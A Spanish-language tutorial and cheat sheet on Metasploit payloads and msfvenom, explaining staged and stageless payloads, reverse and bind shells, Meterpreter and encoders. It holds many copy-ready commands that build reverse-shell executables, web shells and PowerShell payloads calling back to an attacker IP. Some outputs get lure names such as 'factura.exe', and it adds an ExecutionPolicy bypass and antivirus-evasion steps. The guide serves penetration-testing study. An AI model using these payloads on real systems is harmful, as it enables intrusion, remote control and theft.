# Tipos de Payloads — Guía Completa

> Un **payload** es el código que se ejecuta en el sistema objetivo tras una explotación exitosa. Elegir el payload correcto es tan importante como elegir el exploit.

---

## Tabla de contenidos

1. [¿Qué es un payload?](#1-qué-es-un-payload)
2. [Singles, Stagers y Staged](#2-singles-stagers-y-staged)
3. [Reverse Shell vs Bind Shell](#3-reverse-shell-vs-bind-shell)
4. [Meterpreter vs Shell básica](#4-meterpreter-vs-shell-básica)
5. [Nomenclatura de payloads en Metasploit](#5-nomenclatura-de-payloads-en-metasploit)
6. [Payloads más importantes](#6-payloads-más-importantes)
7. [msfvenom — Generación de payloads](#7-msfvenom--generación-de-payloads)
8. [Encoders y evasión](#8-encoders-y-evasión)
9. [Tabla comparativa](#9-tabla-comparativa)
10. [Cheat Sheet msfvenom](#10-cheat-sheet-msfvenom)

---

## 1. ¿Qué es un payload?

El payload es la "carga útil" del ataque: el código que realmente hace algo en el sistema víctima después de que el exploit ha abierto la puerta.

```
┌─────────────────────────────────────────────────────────┐
│                    CADENA DE ATAQUE                     │
│                                                         │
│  EXPLOIT ──────────────────────────► abre la puerta    │
│  (aprovecha CVE-2017-0144 en SMB)                       │
│                                                         │
│  PAYLOAD ──────────────────────────► hace algo útil    │
│  (reverse shell, Meterpreter, descargar ejecutable)     │
└─────────────────────────────────────────────────────────┘
```

---

## 2. Singles, Stagers y Staged

Esta es **la distinción más importante** que hay que entender sobre los payloads de Metasploit.

### Singles (Payloads inline/stageless)

El payload completo en un solo archivo. No necesita conexión adicional para descargar más código.

```
┌──────────────────────────────────────┐
│         PAYLOAD SINGLE               │
│                                      │
│  [Shellcode completo + todo en uno]  │
│                                      │
│  • Tamaño: grande (~200-500 KB)      │
│  • Funciona sin conexión de red      │
│  • Más fácil de detectar             │
│  • Ideal cuando el canal es fiable   │
└──────────────────────────────────────┘
```

**Identificación:** el nombre tiene solo UNA barra separando OS/payload.

```
windows/x64/meterpreter_reverse_tcp    ← Single (stageless)
linux/x64/meterpreter_reverse_tcp      ← Single (stageless)
```

---

### Staged (Stager + Stage)

El payload se divide en dos partes:

1. **Stager:** pequeño shellcode que solo hace UNA cosa — conectarse al atacante y descargar el Stage.
2. **Stage:** el payload real (Meterpreter, shell, VNC...) que se recibe en memoria.

```
┌─────────────────────────────────────────────────────────┐
│                   PAYLOAD STAGED                        │
│                                                         │
│  STAGER (pequeño ~300 bytes)                            │
│  ┌────────────────────────────────┐                     │
│  │ 1. Conectar a 192.168.1.35:4444│                     │
│  │ 2. Recibir Stage               │──► SE EJECUTA       │
│  │ 3. Cargar Stage en memoria     │    EN EL OBJETIVO   │
│  └────────────────────────────────┘                     │
│              │ descarga                                 │
│              ▼                                          │
│  STAGE (grande, Meterpreter completo)                   │
│  ┌────────────────────────────────┐                     │
│  │ Meterpreter, funciones,        │──► VIENE DEL        │
│  │ extensiones, TLS...            │    ATACANTE         │
│  └────────────────────────────────┘                     │
└─────────────────────────────────────────────────────────┘
```

**Identificación:** el nombre tiene DOS barras (OS/arquitectura/payload).

```
windows/x64/meterpreter/reverse_tcp    ← Staged
windows/x64/shell/reverse_tcp          ← Staged (shell simple)
```

---

### ¿Cuándo usar cada uno?

| Situación | Recomendación |
|-----------|---------------|
| El exploit tiene espacio limitado para el payload | **Staged** (el stager es pequeño) |
| La red es estable y hay buena conexión | **Staged** (más funcionalidades) |
| El objetivo no puede hacer conexiones de vuelta | **Single** (todo en el archivo) |
| Máximo sigilo, mínimo tráfico de red | **Single** |
| Auditorías complejas con Meterpreter completo | **Staged** |

---

## 3. Reverse Shell vs Bind Shell

### Reverse Shell

**La víctima se conecta al atacante.** Es el tipo más usado.

```
ATACANTE                    VÍCTIMA
(escucha en puerto 4444)    (ejecuta el payload)
      │◄──────────────────────────│
      │   conexión saliente       │
      │   víctima → atacante      │
      └───────────────────────────┘
```

**¿Por qué es preferible?**
- Los firewalls suelen bloquear conexiones ENTRANTES al objetivo, pero permiten conexiones SALIENTES.
- Una conexión saliente de la víctima parece tráfico web normal.
- El atacante no necesita una IP pública si está en la misma red.

```bash
# Ejemplo en msfvenom:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.35 LPORT=4444 -f exe
#                                                 ^                  ^
#                                                 IP del atacante    Puerto del atacante
```

---

### Bind Shell

**El atacante se conecta a la víctima.** Menos usado.

```
ATACANTE                    VÍCTIMA
                            (abre puerto 4444 y espera)
      │──────────────────────────►│
      │   conexión saliente       │
      │   atacante → víctima      │
      └───────────────────────────┘
```

**¿Cuándo usarla?**
- El atacante está detrás de NAT o no puede recibir conexiones entrantes.
- La víctima tiene una IP pública directa.

```bash
# Ejemplo en msfvenom:
msfvenom -p windows/x64/shell/bind_tcp RHOST=192.168.1.41 LPORT=4444 -f exe
```

---

## 4. Meterpreter vs Shell básica

### Shell básica (cmd.exe / /bin/bash)

Una shell simple que proporciona un terminal del sistema operativo.

```bash
# Lo que obtienes con un payload shell simple:
C:\Windows\system32> whoami
desktop-01o917c\macu

C:\Windows\system32> ipconfig
# ...resultados del ipconfig...
```

**Limitaciones:**
- Sin cifrado (tráfico en texto plano)
- Escribe en disco (se puede detectar)
- Sin funciones avanzadas de Metasploit
- Si se cierra la ventana, se pierde la sesión

---

### Meterpreter

Un intérprete avanzado que vive enteramente en memoria RAM.

**Ventajas sobre la shell básica:**

| Característica | Shell Básica | Meterpreter |
|----------------|--------------|-------------|
| Cifrado del tráfico | ❌ Texto plano | ✅ TLS |
| Ejecución en memoria | ❌ Escribe en disco | ✅ Solo en RAM |
| Migración de procesos | ❌ | ✅ migrate |
| Download/Upload | ❌ Manual | ✅ Comandos integrados |
| Captura de pantalla | ❌ | ✅ screenshot |
| Keylogger | ❌ | ✅ keyscan_* |
| Cámara web | ❌ | ✅ webcam_stream |
| Extensiones | ❌ | ✅ kiwi, incognito... |
| Detección forense | ❌ Alta | ✅ Baja (in-memory) |

---

## 5. Nomenclatura de payloads en Metasploit

Los nombres de los payloads siguen siempre la misma estructura:

```
windows / x64 / meterpreter / reverse_tcp
   │       │         │              │
   │       │         │              └── Tipo de conexión
   │       │         └─────────────── Tipo de payload
   │       └───────────────────────── Arquitectura
   └───────────────────────────────── Sistema operativo
```

### Sistemas operativos

```
windows       → Windows (todas las versiones)
linux         → Linux
osx           → macOS
android       → Android
java          → JVM (multiplataforma)
php           → PHP
python        → Python
ruby          → Ruby
```

### Arquitecturas

```
x86     → 32 bits
x64     → 64 bits
arm     → ARM (móviles, Raspberry Pi)
```

### Tipos de payload

```
meterpreter         → Metasploit Meterpreter completo (staged)
meterpreter_reverse → Meterpreter completo (stageless)
shell               → Shell simple del SO (staged)
shell_reverse       → Shell simple (stageless)
vncinject           → Servidor VNC inyectado
```

### Tipos de conexión

```
reverse_tcp         → Conexión inversa por TCP (el más común)
reverse_https       → Conexión inversa por HTTPS (más sigilosa)
reverse_http        → Conexión inversa por HTTP
bind_tcp            → Abre un puerto en la víctima y espera
reverse_tcp_allports → Prueba todos los puertos hasta encontrar uno abierto
```

---

## 6. Payloads más importantes

### Windows

```bash
# El más usado: staged, Meterpreter, TCP
windows/x64/meterpreter/reverse_tcp

# Stageless (todo en el binario, sin descarga adicional):
windows/x64/meterpreter_reverse_tcp

# Más sigiloso (tráfico por HTTPS, difícil de bloquear):
windows/x64/meterpreter/reverse_https

# Shell básica staged (cuando Meterpreter no funciona):
windows/x64/shell/reverse_tcp

# PowerShell (para evadir restricciones de EXE):
windows/x64/powershell_reverse_tcp
```

### Linux

```bash
# Meterpreter staged para Linux 64-bit
linux/x64/meterpreter/reverse_tcp

# Stageless
linux/x64/meterpreter_reverse_tcp

# Shell básica
linux/x64/shell/reverse_tcp
linux/x86/shell/reverse_tcp       # Para sistemas 32-bit
```

### Multiplataforma / Web

```bash
# PHP (para subir a un servidor web comprometido)
php/meterpreter/reverse_tcp

# Python (funciona en cualquier sistema con Python)
python/meterpreter/reverse_tcp

# Java (JARs, aplicaciones Java)
java/meterpreter/reverse_tcp
```

---

## 7. msfvenom — Generación de payloads

**msfvenom** es la herramienta standalone de Metasploit para generar payloads sin necesidad de lanzar msfconsole.

### Sintaxis básica

```bash
msfvenom [opciones] -p <PAYLOAD> <OPCIONES_PAYLOAD> -f <FORMATO> -o <ARCHIVO>
```

### Opciones principales

| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `-p` | Payload a usar | `-p windows/x64/meterpreter/reverse_tcp` |
| `LHOST` | IP del atacante (para reverse) | `LHOST=192.168.1.35` |
| `LPORT` | Puerto del atacante | `LPORT=4444` |
| `-f` | Formato de salida | `-f exe` |
| `-o` | Archivo de salida | `-o payload.exe` |
| `-e` | Encoder a usar | `-e x86/shikata_ga_nai` |
| `-i` | Iteraciones del encoder | `-i 5` |
| `-a` | Arquitectura | `-a x64` |
| `--platform` | Plataforma | `--platform windows` |
| `-b` | Bytes a evitar (bad chars) | `-b '\x00\x0a'` |
| `--list payloads` | Listar payloads disponibles | |
| `--list formats` | Listar formatos disponibles | |

### Formatos de salida más importantes

#### Ejecutables

```bash
exe          → Windows PE executable (.exe)
elf          → Linux ELF executable
macho        → macOS Mach-O executable
dll          → Windows DLL
```

#### Scripting

```bash
python / py  → Script Python
rb           → Script Ruby
pl           → Script Perl
ps1          → Script PowerShell
```

#### Web

```bash
asp          → ASP web shell (IIS)
aspx         → ASP.NET web shell
php          → PHP web shell
war          → Java WAR (Tomcat)
jsp          → Java JSP
```

#### Raw / Código

```bash
raw          → Shellcode crudo (para embeber en otro programa)
c            → Código C con el shellcode embebido
```

---

### Ejemplos prácticos de msfvenom

#### Windows — Ejecutable .exe (el más común)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=192.168.1.35 LPORT=4444 \
         -f exe \
         -o factura.exe

# Información del resultado:
# Payload size: 510 bytes
# Final size of exe file: 7168 bytes
# Saved as: factura.exe
```

#### Windows — Stageless (sin descarga adicional)

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp \
         LHOST=192.168.1.35 LPORT=4444 \
         -f exe \
         -o payload_stageless.exe
```

#### Windows — Por HTTPS (más sigiloso)

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
         LHOST=192.168.1.35 LPORT=443 \
         -f exe \
         -o update_windows.exe
# Puerto 443: el tráfico HTTPS es raro bloquearlo en firewalls corporativos
```

#### Linux — ELF binario

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
         LHOST=192.168.1.35 LPORT=4444 \
         -f elf \
         -o backdoor.elf

chmod +x backdoor.elf    # Dar permisos de ejecución
```

#### PHP — Web shell

```bash
msfvenom -p php/meterpreter/reverse_tcp \
         LHOST=192.168.1.35 LPORT=4444 \
         -f raw \
         -o shell.php

# Subir al servidor web comprometido y acceder por navegador
```

#### PowerShell — Evadir restricciones de ejecutables

```bash
msfvenom -p windows/x64/powershell_reverse_tcp \
         LHOST=192.168.1.35 LPORT=4444 \
         -f ps1 \
         -o payload.ps1

# Ejecutar en la víctima (requiere bypasear ExecutionPolicy):
powershell -ExecutionPolicy Bypass -File payload.ps1
```

#### Python — Multiplataforma

```bash
msfvenom -p python/meterpreter/reverse_tcp \
         LHOST=192.168.1.35 LPORT=4444 \
         -f raw \
         -o payload.py

python3 payload.py    # En el objetivo
```

---

### Configurar el handler en Metasploit

Tras generar el payload, hay que levantar el listener que espera la conexión:

```bash
msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.35
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > run
```

O más rápido, con un script .rc:

```bash
# Crear handler.rc
cat > handler.rc << 'EOF'
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.35
set LPORT 4444
set ExitOnSession false
run -j
EOF

# Lanzar msfconsole con el script
msfconsole -r handler.rc
```

---

## 8. Encoders y evasión

Los encoders transforman el shellcode para evitar la detección por antivirus basada en firmas.

### ¿Por qué se detectan los payloads de msfvenom?

Los antivirus modernos tienen las **firmas** (hash o patrones de bytes) de los payloads de Metasploit en sus bases de datos. Simplemente con generar un exe con msfvenom, es probable que Windows Defender lo detecte.

### Encoders disponibles

```bash
msfvenom --list encoders

# Los más conocidos:
x86/shikata_ga_nai      → XOR polimórfico (el más famoso, ya bien detectado)
x86/jmp_call_additive   → Aditivo
x64/xor                 → XOR para 64-bit
x64/xor_dynamic         → XOR dinámico
cmd/powershell_base64   → Codifica el payload en Base64 para PowerShell
```

### Uso de encoders en msfvenom

```bash
# Aplicar shikata_ga_nai con 5 iteraciones
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=192.168.1.35 LPORT=4444 \
         -e x64/xor_dynamic \
         -i 5 \
         -f exe \
         -o payload_encoded.exe
```

### Limitaciones de los encoders

> **⚠️ Importante:** Los encoders clásicos de msfvenom ya son ampliamente detectados por los AV modernos. Los encoders fueron más efectivos hace 10 años. Hoy en día, para una evasión real se necesitan técnicas avanzadas.

### Técnicas avanzadas de evasión (solo teoría)

| Técnica | Descripción |
|---------|-------------|
| **Custom Packers** | Empaquetadores propios que cifran/comprimen el payload |
| **Shellcode Injection** | Inyectar el shellcode en un proceso legítimo (process hollowing) |
| **Polymorphic Code** | Código que cambia su estructura en cada ejecución |
| **AMSI Bypass** | Deshabilitar el Anti-Malware Scan Interface de Windows antes de ejecutar |
| **In-Memory Execution** | Cargar y ejecutar el payload solo en RAM, sin tocar disco |
| **Signed Binaries Abuse** | Usar binarios legítimos firmados para cargar código (LOLBins) |

Para llegar a FUD (Fully Undetectable) en entornos modernos es necesario combinar varias de estas técnicas y desarrollar herramientas propias.

---

## 9. Tabla comparativa

| Payload | Tipo | SO | Tamaño aprox. | Cifrado | Mejor para |
|---------|------|----|--------------|---------|------------|
| `windows/x64/meterpreter/reverse_tcp` | Staged | Windows | ~10 KB stager | Opcional | Auditorías estándar |
| `windows/x64/meterpreter_reverse_tcp` | Stageless | Windows | ~200 KB | Opcional | Cuando no hay descarga |
| `windows/x64/meterpreter/reverse_https` | Staged | Windows | ~10 KB stager | ✅ TLS | Firewalls corporativos |
| `linux/x64/meterpreter/reverse_tcp` | Staged | Linux | ~10 KB stager | Opcional | Servidores Linux |
| `php/meterpreter/reverse_tcp` | Staged | PHP | ~5 KB | Opcional | Servidores web |
| `python/meterpreter/reverse_tcp` | Staged | Multi | ~5 KB | Opcional | Sistemas con Python |
| `windows/x64/shell/reverse_tcp` | Staged | Windows | ~10 KB stager | ❌ | Compatibilidad máxima |

---

## 10. Cheat Sheet msfvenom

```
══════════════════════════════════════════════════════════════
                   MSFVENOM CHEAT SHEET
══════════════════════════════════════════════════════════════

LISTAR INFORMACIÓN
  msfvenom --list payloads         Todos los payloads
  msfvenom --list formats          Todos los formatos de salida
  msfvenom --list encoders         Todos los encoders

WINDOWS
  -p windows/x64/meterpreter/reverse_tcp    Staged, Meterpreter
  -p windows/x64/meterpreter_reverse_tcp    Stageless, Meterpreter
  -p windows/x64/meterpreter/reverse_https  Staged, HTTPS
  -p windows/x64/shell/reverse_tcp          Shell básica
  -f exe                                    Formato ejecutable

LINUX
  -p linux/x64/meterpreter/reverse_tcp      Staged
  -p linux/x64/meterpreter_reverse_tcp      Stageless
  -f elf                                    Formato ELF

WEB/SCRIPTING
  -p php/meterpreter/reverse_tcp   → -f raw → shell.php
  -p python/meterpreter/reverse_tcp → -f raw → payload.py
  -p windows/x64/powershell_reverse_tcp → -f ps1

OPCIONES CLAVE
  LHOST=TU_IP    IP del atacante (reverse)
  LPORT=4444     Puerto del atacante
  -f FORMAT      Formato de salida
  -o ARCHIVO     Guardar en archivo
  -e ENCODER     Encoder a usar
  -i N           Iteraciones del encoder
  -b '\x00'      Bad characters a evitar

COMANDOS RÁPIDOS
  # Windows EXE básico
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o out.exe

  # Linux ELF
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o out.elf

  # PHP web shell
  msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php

HANDLER .RC (copiar y adaptar)
  use exploit/multi/handler
  set payload windows/x64/meterpreter/reverse_tcp
  set LHOST TU_IP
  set LPORT 4444
  set ExitOnSession false
  run -j

══════════════════════════════════════════════════════════════
```

---

## Referencias

- [Metasploit Payloads Documentation](https://docs.metasploit.com/docs/using-metasploit/basics/how-payloads-work.html)
- [msfvenom Cheat Sheet — OffSec](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [MITRE ATT&CK — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
